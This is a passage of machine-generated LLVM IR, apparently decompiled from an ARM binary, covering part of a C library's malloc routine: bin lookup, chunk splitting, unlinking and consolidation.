  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  %v4_14f54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 %v4_14f54, i32* %ip.global-to-local, align 4
  store i32 85856, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f54)
  %v0_14f60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14f60, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_14f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 20) to i32*), align 4
  store i32 %v4_14f6c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14f78.1127 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14f6c)
  %v0_14f78 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_14f78, -32
  br i1 %tmp, label %dec_label_pc_14f94, label %dec_label_pc_14f80

dec_label_pc_14f80:                               ; preds = %entry
  %v0_14f80 = call i32 @__GI___errno_location()
  store i32 %v0_14f80, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_14f8c = inttoptr i32 %v0_14f80 to i32*
  store i32 12, i32* %v2_14f8c, align 4
  br label %dec_label_pc_15810

dec_label_pc_14f94:                               ; preds = %entry
  %v1_14f94 = add i32 %v0_14f78, 11
  store i32 %v1_14f94, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v2_14fa0 = icmp ugt i32 %v1_14f94, 14
  %v7_14fa0 = icmp eq i32 %v1_14f94, 15
  %v2_14fa4 = xor i1 %v7_14fa0, true
  %v3_14fa4 = and i1 %v2_14fa0, %v2_14fa4
  br i1 %v3_14fa4, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_14f94
  %v5_14fa4 = and i32 %v1_14f94, -8
  store i32 %v5_14fa4, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_14f94, %bb
  %v4_14fa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_14fa8, i32* @r0, align 4
  %v1_14fac = inttoptr i32 %v4_14fa8 to i32*
  %v2_14fac = load i32, i32* %v1_14fac, align 4
  store i32 %v2_14fac, i32* @r4, align 4
  %v2_14fb0 = xor i1 %v2_14fa0, true
  %v3_14fb0 = or i1 %v7_14fa0, %v2_14fb0
  br i1 %v3_14fb0, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_14fb4 = urem i32 %v2_14fac, 2
  %v2_14fb4 = icmp eq i32 %v1_14fb4, 0
  br i1 %v2_14fb4, label %dec_label_pc_14fbc, label %dec_label_pc_14fcc

dec_label_pc_14fbc:                               ; preds = %bb140
  %v2_14fbc = icmp eq i32 %v2_14fac, 0
  br i1 %v2_14fbc, label %dec_label_pc_14fc4, label %dec_label_pc_153a8

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14fbc
  %v0_14fc4 = call i32 @__malloc_consolidate()
  store i32 %v0_14fc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153a8

dec_label_pc_14fcc:                               ; preds = %bb140
  %v0_14fcc = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_14fcc, %v2_14fac
  br i1 %tmp201, label %dec_label_pc_14ff4, label %dec_label_pc_14fd4

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fcc
  %v1_14fd4 = add i32 %v4_14fa8, -4
  store i32 %v1_14fd4, i32* %r1.global-to-local, align 4
  %v3_14fd8 = udiv i32 %v0_14fcc, 8
  store i32 %v3_14fd8, i32* %r2.global-to-local, align 4
  %v4_14fdc = mul nuw i32 %v3_14fd8, 4
  %v5_14fdc = add i32 %v4_14fdc, %v1_14fd4
  %v6_14fdc = inttoptr i32 %v5_14fdc to i32*
  %v7_14fdc = load i32, i32* %v6_14fdc, align 4
  store i32 %v7_14fdc, i32* %r0.global-to-local, align 4
  %v2_14fe0 = icmp eq i32 %v7_14fdc, 0
  br i1 %v2_14fe0, label %dec_label_pc_14ff4, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14fd4
  %v2_14fe4 = add i32 %v7_14fdc, 8
  %v3_14fe4 = inttoptr i32 %v2_14fe4 to i32*
  %v4_14fe4 = load i32, i32* %v3_14fe4, align 4
  store i32 %v4_14fe4, i32* %r3.global-to-local, align 4
  store i32 %v2_14fe4, i32* %r0.global-to-local, align 4
  store i32 %v2_14fe4, i32* %r4.global-to-local, align 4
  store i32 %v4_14fe4, i32* %v6_14fdc, align 4
  br label %dec_label_pc_157f4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_14fcc
  %tmp202 = icmp ugt i32 %v0_14fcc, 255
  br i1 %tmp202, label %dec_label_pc_15044, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14ff4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_15004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  %v3_15008 = udiv i32 %v0_14fcc, 8
  store i32 %v3_15008, i32* @r7, align 4
  %v4_1500c = mul nuw i32 %v3_15008, 8
  %v5_1500c = add i32 %v4_15004, %v4_1500c
  store i32 %v5_1500c, i32* %r3.global-to-local, align 4
  %v1_15010 = add i32 %v5_1500c, 44
  store i32 %v1_15010, i32* %ip.global-to-local, align 4
  %v1_15014 = add i32 %v5_1500c, 56
  %v2_15014 = inttoptr i32 %v1_15014 to i32*
  %v3_15014 = load i32, i32* %v2_15014, align 4
  store i32 %v3_15014, i32* %r0.global-to-local, align 4
  %v9_15018 = icmp eq i32 %v3_15014, %v1_15010
  br i1 %v9_15018, label %dec_label_pc_151a4, label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_14ffc
  %v2_15020 = add i32 %v3_15014, %v0_14fcc
  store i32 %v2_15020, i32* %r3.global-to-local, align 4
  %v1_15024 = add i32 %v2_15020, 4
  %v2_15024 = inttoptr i32 %v1_15024 to i32*
  %v3_15024 = load i32, i32* %v2_15024, align 4
  store i32 %v3_15024, i32* %r2.global-to-local, align 4
  %v1_15028 = add i32 %v3_15014, 12
  %v2_15028 = inttoptr i32 %v1_15028 to i32*
  %v3_15028 = load i32, i32* %v2_15028, align 4
  store i32 %v3_15028, i32* %r1.global-to-local, align 4
  %v1_1502c = or i32 %v3_15024, 1
  store i32 %v1_1502c, i32* %r2.global-to-local, align 4
  %v1_15030 = add i32 %v3_15014, 8
  store i32 %v1_15030, i32* %r4.global-to-local, align 4
  store i32 %v1_1502c, i32* %v2_15024, align 4
  %v0_15038 = load i32, i32* %ip.global-to-local, align 4
  %v1_15038 = load i32, i32* %r1.global-to-local, align 4
  %v2_15038 = add i32 %v1_15038, 8
  %v3_15038 = inttoptr i32 %v2_15038 to i32*
  store i32 %v0_15038, i32* %v3_15038, align 4
  %v0_1503c = load i32, i32* %r1.global-to-local, align 4
  %v1_1503c = load i32, i32* %ip.global-to-local, align 4
  %v2_1503c = add i32 %v1_1503c, 12
  %v3_1503c = inttoptr i32 %v2_1503c to i32*
  store i32 %v0_1503c, i32* %v3_1503c, align 4
  br label %dec_label_pc_157f4

dec_label_pc_15044:                               ; preds = %dec_label_pc_14ff4
  store i32 %v0_14fcc, i32* %r0.global-to-local, align 4
  %v1_15048 = call i32 @__malloc_largebin_index(i32 %v0_14fcc)
  store i32 %v1_15048, i32* %r0.global-to-local, align 4
  %v0_1504c = load i32, i32* @r4, align 4
  %v1_1504c = and i32 %v0_1504c, 2
  %v2_1504c = icmp eq i32 %v1_1504c, 0
  store i32 %v1_15048, i32* @r7, align 4
  br i1 %v2_1504c, label %dec_label_pc_151a4, label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %dec_label_pc_15044
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_15060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15060, i32* @r0, align 4
  %v0_15064 = call i32 @__malloc_consolidate()
  store i32 %v0_15064, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_151a4

dec_label_pc_1506c:                               ; preds = %dec_label_pc_151b8
  %v1_1506c = add i32 %v3_151b8, 4
  %v2_1506c = inttoptr i32 %v1_1506c to i32*
  %v3_1506c = load i32, i32* %v2_1506c, align 4
  store i32 %v3_1506c, i32* %r3.global-to-local, align 4
  %v0_15070 = load i32, i32* @sl, align 4
  %v1_15074 = and i32 %v3_1506c, -4
  store i32 %v1_15074, i32* %r4.global-to-local, align 4
  %v1_15078 = add i32 %v3_151b8, 12
  %v2_15078 = inttoptr i32 %v1_15078 to i32*
  %v3_15078 = load i32, i32* %v2_15078, align 4
  store i32 %v3_15078, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_15070, 255
  br i1 %tmp203, label %dec_label_pc_150d4, label %dec_label_pc_15080

dec_label_pc_15080:                               ; preds = %dec_label_pc_1506c
  %v9_15080 = icmp eq i32 %v3_15078, %v0_150d8
  br i1 %v9_15080, label %dec_label_pc_15088, label %dec_label_pc_150d4

dec_label_pc_15088:                               ; preds = %dec_label_pc_15080
  %v0_15088 = load i32, i32* @sb, align 4
  %v1_15088 = add i32 %v0_15088, 48
  %v2_15088 = inttoptr i32 %v1_15088 to i32*
  %v3_15088 = load i32, i32* %v2_15088, align 4
  store i32 %v3_15088, i32* %r3.global-to-local, align 4
  %v9_1508c = icmp eq i32 %v3_151b8, %v3_15088
  br i1 %v9_1508c, label %dec_label_pc_15094, label %dec_label_pc_150d4

dec_label_pc_15094:                               ; preds = %dec_label_pc_15088
  %v1_15094 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_15074, %v1_15094
  br i1 %tmp204, label %dec_label_pc_1509c, label %dec_label_pc_150d4

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15094
  %v2_1509c = sub i32 %v1_15074, %v0_15070
  store i32 %v2_1509c, i32* %r2.global-to-local, align 4
  %v2_150a0 = add i32 %v0_15070, %v3_151b8
  store i32 %v2_150a0, i32* %r3.global-to-local, align 4
  %v1_150a4 = or i32 %v0_15070, 1
  store i32 %v1_150a4, i32* %r0.global-to-local, align 4
  %v1_150a8 = or i32 %v2_1509c, 1
  store i32 %v1_150a8, i32* %r1.global-to-local, align 4
  %v1_150ac = add i32 %v3_151b8, 8
  store i32 %v1_150ac, i32* %r4.global-to-local, align 4
  %v2_150b0 = add i32 %v0_150d8, 8
  %v3_150b0 = inttoptr i32 %v2_150b0 to i32*
  store i32 %v2_150a0, i32* %v3_150b0, align 4
  %v0_150b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_150b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_150b4 = add i32 %v1_150b4, 12
  %v3_150b4 = inttoptr i32 %v2_150b4 to i32*
  store i32 %v0_150b4, i32* %v3_150b4, align 4
  %v0_150b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_150b8 = load i32, i32* @r6, align 4
  %v2_150b8 = add i32 %v1_150b8, 4
  %v3_150b8 = inttoptr i32 %v2_150b8 to i32*
  store i32 %v0_150b8, i32* %v3_150b8, align 4
  %v0_150bc = load i32, i32* %r3.global-to-local, align 4
  %v1_150bc = load i32, i32* @sb, align 4
  %v2_150bc = add i32 %v1_150bc, 48
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  store i32 %v0_150bc, i32* %v3_150bc, align 4
  %v0_150c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_150c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_150c0 = add i32 %v1_150c0, %v0_150c0
  %v4_150c0 = inttoptr i32 %v3_150c0 to i32*
  store i32 %v0_150c0, i32* %v4_150c0, align 4
  %v0_150c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_150c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_150c4 = add i32 %v1_150c4, 4
  %v3_150c4 = inttoptr i32 %v2_150c4 to i32*
  store i32 %v0_150c4, i32* %v3_150c4, align 4
  %v0_150c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_150c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_150c8 = add i32 %v1_150c8, 12
  %v3_150c8 = inttoptr i32 %v2_150c8 to i32*
  store i32 %v0_150c8, i32* %v3_150c8, align 4
  %v0_150cc = load i32, i32* %ip.global-to-local, align 4
  %v1_150cc = load i32, i32* %r3.global-to-local, align 4
  %v2_150cc = add i32 %v1_150cc, 8
  %v3_150cc = inttoptr i32 %v2_150cc to i32*
  store i32 %v0_150cc, i32* %v3_150cc, align 4
  br label %dec_label_pc_157f4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_15094, %dec_label_pc_15088, %dec_label_pc_15080, %dec_label_pc_1506c
  %v9_150d4 = icmp eq i32 %v1_15074, %v0_15070
  %v2_150d8 = add i32 %v3_15078, 8
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v0_150d8, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* %ip.global-to-local, align 4
  %v1_150dc = load i32, i32* %r5.global-to-local, align 4
  %v2_150dc = add i32 %v1_150dc, 12
  %v3_150dc = inttoptr i32 %v2_150dc to i32*
  store i32 %v0_150dc, i32* %v3_150dc, align 4
  br i1 %v9_150d4, label %dec_label_pc_15234.loopexit, label %dec_label_pc_150f0

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150d4
  %v0_150f0 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_150f0, 255
  br i1 %tmp205, label %dec_label_pc_15114, label %dec_label_pc_150f8

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150f0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v1_150fc = load i32, i32* %r8.global-to-local, align 4
  %v2_150fc = add i32 %v1_150fc, ptrtoint (i32* @global_var_28010.981 to i32)
  %v3_150fc = inttoptr i32 %v2_150fc to i32*
  %v4_150fc = load i32, i32* %v3_150fc, align 4
  %v3_15100 = udiv i32 %v0_150f0, 8
  store i32 %v3_15100, i32* %r0.global-to-local, align 4
  %v4_15104 = mul nuw i32 %v3_15100, 8
  %v5_15104 = add i32 %v4_150fc, %v4_15104
  store i32 %v5_15104, i32* %r3.global-to-local, align 4
  %v1_15108 = add i32 %v5_15104, 44
  store i32 %v1_15108, i32* %ip.global-to-local, align 4
  %v1_1510c = add i32 %v5_15104, 52
  %v2_1510c = inttoptr i32 %v1_1510c to i32*
  %v3_1510c = load i32, i32* %v2_1510c, align 4
  store i32 %v3_1510c, i32* @lr, align 4
  br label %dec_label_pc_1516c

dec_label_pc_15114:                               ; preds = %dec_label_pc_150f0
  store i32 %v0_150f0, i32* %r0.global-to-local, align 4
  %v1_15118 = call i32 @__malloc_largebin_index(i32 %v0_150f0)
  store i32 %v1_15118, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  %v1_15120 = load i32, i32* %r8.global-to-local, align 4
  %v2_15120 = add i32 %v1_15120, ptrtoint (i32* @global_var_28010.981 to i32)
  %v3_15120 = inttoptr i32 %v2_15120 to i32*
  %v4_15120 = load i32, i32* %v3_15120, align 4
  %v4_15124 = mul i32 %v1_15118, 8
  %v5_15124 = add i32 %v4_15120, %v4_15124
  store i32 %v5_15124, i32* %r3.global-to-local, align 4
  %v1_15128 = add i32 %v5_15124, 44
  store i32 %v1_15128, i32* %ip.global-to-local, align 4
  %v1_1512c = add i32 %v5_15124, 52
  %v2_1512c = inttoptr i32 %v1_1512c to i32*
  %v3_1512c = load i32, i32* %v2_1512c, align 4
  store i32 %v3_1512c, i32* @lr, align 4
  %v9_15130 = icmp eq i32 %v3_1512c, %v1_15128
  br i1 %v9_15130, label %dec_label_pc_1516c, label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_15114
  %v1_15138 = add i32 %v5_15124, 56
  %v2_15138 = inttoptr i32 %v1_15138 to i32*
  %v3_15138 = load i32, i32* %v2_15138, align 4
  store i32 %v3_15138, i32* %r1.global-to-local, align 4
  %v1_1513c = add i32 %v3_15138, 4
  %v2_1513c = inttoptr i32 %v1_1513c to i32*
  %v3_1513c = load i32, i32* %v2_1513c, align 4
  store i32 %v3_1513c, i32* %r3.global-to-local, align 4
  %v0_15140 = load i32, i32* %r4.global-to-local, align 4
  %v3_15140 = icmp ult i32 %v0_15140, %v3_1513c
  br i1 %v3_15140, label %.thread, label %dec_label_pc_1515c.preheader

.thread:                                          ; preds = %dec_label_pc_15138
  store i32 %v1_15128, i32* @lr, align 4
  store i32 %v3_15138, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1516c

dec_label_pc_1515c.preheader:                     ; preds = %dec_label_pc_15138
  %v2_15148 = or i32 %v0_15140, 1
  store i32 %v2_15148, i32* %r2.global-to-local, align 4
  %v1_1515c179 = add i32 %v3_1512c, 4
  %v2_1515c180 = inttoptr i32 %v1_1515c179 to i32*
  %v3_1515c181 = load i32, i32* %v2_1515c180, align 4
  store i32 %v3_1515c181, i32* %r3.global-to-local, align 4
  %v3_15160183 = icmp ult i32 %v2_15148, %v3_1515c181
  br i1 %v3_15160183, label %dec_label_pc_15158, label %dec_label_pc_15168

dec_label_pc_15158:                               ; preds = %dec_label_pc_1515c.preheader, %dec_label_pc_15158
  %v0_15168184 = phi i32 [ %v3_15158, %dec_label_pc_15158 ], [ %v3_1512c, %dec_label_pc_1515c.preheader ]
  %v1_15158 = add i32 %v0_15168184, 8
  %v2_15158 = inttoptr i32 %v1_15158 to i32*
  %v3_15158 = load i32, i32* %v2_15158, align 4
  store i32 %v3_15158, i32* @lr, align 4
  %v1_1515c = add i32 %v3_15158, 4
  %v2_1515c = inttoptr i32 %v1_1515c to i32*
  %v3_1515c = load i32, i32* %v2_1515c, align 4
  store i32 %v3_1515c, i32* %r3.global-to-local, align 4
  %v3_15160 = icmp ult i32 %v2_15148, %v3_1515c
  br i1 %v3_15160, label %dec_label_pc_15158, label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_15158, %dec_label_pc_1515c.preheader
  %v0_15168.lcssa = phi i32 [ %v3_1512c, %dec_label_pc_1515c.preheader ], [ %v3_15158, %dec_label_pc_15158 ]
  %v1_15168 = add i32 %v0_15168.lcssa, 12
  %v2_15168 = inttoptr i32 %v1_15168 to i32*
  %v3_15168 = load i32, i32* %v2_15168, align 4
  store i32 %v3_15168, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %.thread, %dec_label_pc_15114, %dec_label_pc_150f8, %dec_label_pc_15168
  %v0_1518c = phi i32 [ %v1_15128, %dec_label_pc_15114 ], [ %v1_15108, %dec_label_pc_150f8 ], [ %v3_15168, %dec_label_pc_15168 ], [ %v3_15138, %.thread ]
  %v0_15180 = phi i32 [ %v1_15118, %dec_label_pc_15114 ], [ %v3_15100, %dec_label_pc_150f8 ], [ %v1_15118, %dec_label_pc_15168 ], [ %v1_15118, %.thread ]
  %v1_15170 = phi i32 [ %v1_15120, %dec_label_pc_15114 ], [ %v1_150fc, %dec_label_pc_150f8 ], [ %v1_15120, %dec_label_pc_15168 ], [ %v1_15120, %.thread ]
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v2_15170 = add i32 %v1_15170, ptrtoint (i32* @global_var_28010.981 to i32)
  %v3_15170 = inttoptr i32 %v2_15170 to i32*
  %v4_15170 = load i32, i32* %v3_15170, align 4
  %v3_15174 = sdiv i32 %v0_15180, 32
  store i32 %v3_15174, i32* %r3.global-to-local, align 4
  %v4_15178 = mul nsw i32 %v3_15174, 4
  %v5_15178 = add i32 %v4_15170, %v4_15178
  store i32 %v5_15178, i32* %r1.global-to-local, align 4
  %v1_1517c = add i32 %v5_15178, 820
  %v2_1517c = inttoptr i32 %v1_1517c to i32*
  %v3_1517c = load i32, i32* %v2_1517c, align 4
  %v1_15180 = urem i32 %v0_15180, 32
  store i32 %v1_15180, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_15188 = shl i32 1, %v1_15180
  %v8_15188 = or i32 %v3_1517c, %v7_15188
  store i32 %v8_15188, i32* %r3.global-to-local, align 4
  %v1_1518c = load i32, i32* @r6, align 4
  %v2_1518c = add i32 %v1_1518c, 12
  %v3_1518c = inttoptr i32 %v2_1518c to i32*
  store i32 %v0_1518c, i32* %v3_1518c, align 4
  %v0_15190 = load i32, i32* @lr, align 4
  %v1_15190 = load i32, i32* @r6, align 4
  %v2_15190 = add i32 %v1_15190, 8
  %v3_15190 = inttoptr i32 %v2_15190 to i32*
  store i32 %v0_15190, i32* %v3_15190, align 4
  %v0_15194 = load i32, i32* %r3.global-to-local, align 4
  %v1_15194 = load i32, i32* %r1.global-to-local, align 4
  %v2_15194 = add i32 %v1_15194, 820
  %v3_15194 = inttoptr i32 %v2_15194 to i32*
  store i32 %v0_15194, i32* %v3_15194, align 4
  %v0_15198 = load i32, i32* @r6, align 4
  %v1_15198 = load i32, i32* @lr, align 4
  %v2_15198 = add i32 %v1_15198, 12
  %v3_15198 = inttoptr i32 %v2_15198 to i32*
  store i32 %v0_15198, i32* %v3_15198, align 4
  %v0_1519c = load i32, i32* @r6, align 4
  %v1_1519c = load i32, i32* %ip.global-to-local, align 4
  %v2_1519c = add i32 %v1_1519c, 8
  %v3_1519c = inttoptr i32 %v2_1519c to i32*
  store i32 %v0_1519c, i32* %v3_1519c, align 4
  %v0_151b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_151b8

dec_label_pc_151a4:                               ; preds = %dec_label_pc_15044, %dec_label_pc_14ffc, %dec_label_pc_15058
  store i32 36, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_151ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_151ac, i32* @sb, align 4
  %v0_151b0 = load i32, i32* @sl, align 4
  %v1_151b0 = add i32 %v0_151b0, 16
  store i32 %v1_151b0, i32* @fp, align 4
  %v1_151b4 = add i32 %v4_151ac, 52
  store i32 %v1_151b4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_1516c, %dec_label_pc_151a4
  %v0_150d8 = phi i32 [ %v0_151b8.pre, %dec_label_pc_1516c ], [ %v1_151b4, %dec_label_pc_151a4 ]
  %v1_151b8 = add i32 %v0_150d8, 12
  %v2_151b8 = inttoptr i32 %v1_151b8 to i32*
  %v3_151b8 = load i32, i32* %v2_151b8, align 4
  store i32 %v3_151b8, i32* @r6, align 4
  %v9_151bc = icmp eq i32 %v3_151b8, %v0_150d8
  br i1 %v9_151bc, label %dec_label_pc_151c4, label %dec_label_pc_1506c

dec_label_pc_151c4:                               ; preds = %dec_label_pc_151b8
  %v0_151c4 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_151c4, 256
  %v0_1527c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_151c4.dec_label_pc_1527c_crit_edge, label %dec_label_pc_151cc

dec_label_pc_151c4.dec_label_pc_1527c_crit_edge:  ; preds = %dec_label_pc_151c4
  %.pre200 = mul i32 %v0_1527c.pre, 8
  br label %dec_label_pc_1527c

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151c4
  %v4_151cc = mul i32 %v0_1527c.pre, 8
  %v5_151cc = add i32 %v4_151cc, %v0_150d8
  store i32 %v5_151cc, i32* %r3.global-to-local, align 4
  %v1_151d0 = add i32 %v5_151cc, -8
  store i32 %v1_151d0, i32* %r1.global-to-local, align 4
  %v1_151d4 = add i32 %v5_151cc, 4
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  %storemerge.pre = load i32, i32* %v2_151d4, align 4
  br label %dec_label_pc_15274

dec_label_pc_151dc:                               ; preds = %dec_label_pc_15274
  %v1_151dc = add i32 %v1_15204, 4
  %v2_151dc = inttoptr i32 %v1_151dc to i32*
  %v3_151dc = load i32, i32* %v2_151dc, align 4
  store i32 %v3_151dc, i32* %r3.global-to-local, align 4
  %v1_151e0 = and i32 %v3_151dc, -4
  store i32 %v1_151e0, i32* %r2.global-to-local, align 4
  %v3_151e4 = icmp ult i32 %v1_151e0, %v0_151c4
  %v1_151e8 = add i32 %v1_15204, 12
  %v2_151e8 = inttoptr i32 %v1_151e8 to i32*
  %v3_151e8 = load i32, i32* %v2_151e8, align 4
  store i32 %v3_151e8, i32* %r0.global-to-local, align 4
  br i1 %v3_151e4, label %dec_label_pc_15274, label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151dc
  %v1_151f0 = add i32 %v1_15204, 8
  %v2_151f0 = inttoptr i32 %v1_151f0 to i32*
  %v3_151f0 = load i32, i32* %v2_151f0, align 4
  store i32 %v3_151f0, i32* %r1.global-to-local, align 4
  %v1_151f4 = add i32 %v3_151f0, 12
  %v2_151f4 = inttoptr i32 %v1_151f4 to i32*
  %v3_151f4 = load i32, i32* %v2_151f4, align 4
  store i32 %v3_151f4, i32* %r3.global-to-local, align 4
  %v9_151f8 = icmp eq i32 %v3_151f4, %v1_15204
  br i1 %v9_151f8, label %dec_label_pc_15200, label %dec_label_pc_1520c

dec_label_pc_15200:                               ; preds = %dec_label_pc_151f0
  %v1_15200 = add i32 %v3_151e8, 8
  %v2_15200 = inttoptr i32 %v1_15200 to i32*
  %v3_15200 = load i32, i32* %v2_15200, align 4
  store i32 %v3_15200, i32* %r3.global-to-local, align 4
  %v9_15204 = icmp eq i32 %v3_15200, %v1_15204
  br i1 %v9_15204, label %dec_label_pc_15210, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151f0, %dec_label_pc_15200
  %v0_1520c = call i32 @abort()
  store i32 %v0_1520c, i32* %r0.global-to-local, align 4
  %v0_15210.pre = load i32, i32* @sl, align 4
  %v1_15210.pre = load i32, i32* @r2, align 4
  %v0_15218.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15210

dec_label_pc_15210:                               ; preds = %dec_label_pc_15200, %dec_label_pc_1520c
  %v1_15218 = phi i32 [ %v3_151e8, %dec_label_pc_15200 ], [ %v0_1520c, %dec_label_pc_1520c ]
  %v0_15218 = phi i32 [ %v3_151f0, %dec_label_pc_15200 ], [ %v0_15218.pre, %dec_label_pc_1520c ]
  %v1_15210 = phi i32 [ %v1_151e0, %dec_label_pc_15200 ], [ %v1_15210.pre, %dec_label_pc_1520c ]
  %v0_15210 = phi i32 [ %v0_151c4, %dec_label_pc_15200 ], [ %v0_15210.pre, %dec_label_pc_1520c ]
  %v2_15210 = sub i32 %v1_15210, %v0_15210
  store i32 %v2_15210, i32* %lr.global-to-local, align 4
  %v2_15218 = add i32 %v1_15218, 8
  %v3_15218 = inttoptr i32 %v2_15218 to i32*
  store i32 %v0_15218, i32* %v3_15218, align 4
  %v0_1521c = load i32, i32* %r0.global-to-local, align 4
  %v1_1521c = load i32, i32* %r1.global-to-local, align 4
  %v2_1521c = add i32 %v1_1521c, 12
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  store i32 %v0_1521c, i32* %v3_1521c, align 4
  %v0_15220 = load i32, i32* %ip.global-to-local, align 4
  %v1_15220 = add i32 %v0_15220, 8
  store i32 %v1_15220, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_15210, 15
  br i1 %tmp207, label %dec_label_pc_15240, label %dec_label_pc_15228

dec_label_pc_15228:                               ; preds = %dec_label_pc_15210
  %v1_15228 = load i32, i32* %r2.global-to-local, align 4
  %v2_15228 = add i32 %v1_15228, %v0_15220
  store i32 %v2_15228, i32* %r2.global-to-local, align 4
  %v1_1522c = add i32 %v2_15228, 4
  %v2_1522c = inttoptr i32 %v1_1522c to i32*
  %v3_1522c = load i32, i32* %v2_1522c, align 4
  store i32 %v3_1522c, i32* %r3.global-to-local, align 4
  store i32 %v1_15220, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15234

dec_label_pc_15234.loopexit:                      ; preds = %dec_label_pc_150d4
  %v1_150e0 = load i32, i32* @r6, align 4
  %v2_150e0 = load i32, i32* @sl, align 4
  %v3_150e0 = add i32 %v2_150e0, %v1_150e0
  store i32 %v3_150e0, i32* %r2.global-to-local, align 4
  %v2_150e4 = add i32 %v3_150e0, 4
  %v3_150e4 = inttoptr i32 %v2_150e4 to i32*
  %v4_150e4 = load i32, i32* %v3_150e4, align 4
  store i32 %v4_150e4, i32* %r3.global-to-local, align 4
  %v2_150e8 = add i32 %v1_150e0, 8
  store i32 %v2_150e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15234

